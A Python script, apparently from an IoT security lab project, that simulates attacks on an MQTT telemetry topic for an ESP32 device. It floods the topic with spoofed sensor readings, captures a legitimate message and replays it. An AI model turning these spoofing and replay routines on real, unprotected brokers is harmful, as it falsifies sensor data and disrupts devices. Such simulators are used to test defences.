import argparse
import json
import time

import paho.mqtt.client as mqtt

BROKER_HOST = "localhost"
BROKER_PORT = 1883
TOPIC = "sentrymesh/esp32-01/telemetry"
DEVICE_ID = "esp32-01"
CAPTURE_FILE = "captured_message.json"

captured_message = {}


def flood(client, count, interval):
    for i in range(count):
        payload = json.dumps(
            {
                "device_id": DEVICE_ID,
                "timestamp": int(time.time() * 1000),
                "temperature": 99.9,
                "humidity": 5.0,
            }
        )
        client.publish(TOPIC, payload)
        print(f"[flood] sent #{i + 1}: {payload}")
        time.sleep(interval)


def on_message(client, userdata, msg):
    global captured_message
    if not captured_message:
        captured_message = json.loads(msg.payload)
        print(f"[capture] captured legitimate message: {captured_message}")
        client.disconnect()


def capture(timeout_seconds=15):
    capture_client = mqtt.Client()
    capture_client.on_message = on_message
    capture_client.connect(BROKER_HOST, BROKER_PORT)
    capture_client.subscribe(TOPIC)
    capture_client.loop_start()

    deadline = time.time() + timeout_seconds
    while not captured_message and time.time() < deadline:
        time.sleep(0.1)

    capture_client.loop_stop()

    if not captured_message:
        print("[capture] no message captured, is the ESP32 currently publishing?")
        return

    with open(CAPTURE_FILE, "w") as f:
        json.dump(captured_message, f)
    print(f"[capture] saved to {CAPTURE_FILE}")


def replay(client, count, interval):
    try:
        with open(CAPTURE_FILE) as f:
            stale_message = json.load(f)
    except FileNotFoundError:
        print(f"[replay] no captured message found, run --mode capture first")
        return

    payload = json.dumps(stale_message)
    for i in range(count):
        client.publish(TOPIC, payload)
        print(f"[replay] resent stale message #{i + 1}: {payload}")
        time.sleep(interval)


def main():
    parser = argparse.ArgumentParser(description="SentryMesh attacker simulator")
    parser.add_argument("--mode", choices=["flood", "capture", "replay"], required=True)
    parser.add_argument("--count", type=int, default=50)
    parser.add_argument("--interval", type=float, default=0.05)
    args = parser.parse_args()

    if args.mode == "capture":
        capture()
        return

    client = mqtt.Client()
    client.connect(BROKER_HOST, BROKER_PORT)

    if args.mode == "flood":
        flood(client, args.count, args.interval)
    else:
        replay(client, args.count, args.interval)

    client.disconnect()


if __name__ == "__main__":
    main()
